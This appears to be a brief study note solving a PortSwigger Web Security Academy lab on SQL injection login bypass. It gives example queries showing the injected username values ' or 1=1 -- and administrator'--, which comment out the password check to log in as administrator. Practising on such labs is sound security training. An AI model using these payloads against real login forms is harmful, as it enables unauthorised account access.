# Lab 2 - SQL injection vulnerability allowing login bypass

LAB - [Lab: SQL injection vulnerability allowing login bypass | Web Security Academy](https://portswigger.net/web-security/sql-injection/lab-login-bypass)

SQL Injection - Login functionality

End Goal: Perform SQLi attack and log in as administrator user.

**Solution:** 

SELECT firstname FROM users where username='admin' and password='admin'

SELECT firstname FROM users where username=' ' or 1=1 --' and password='admin'

or

SELECT firstname FROM users where username='administrator'--' and password='admin'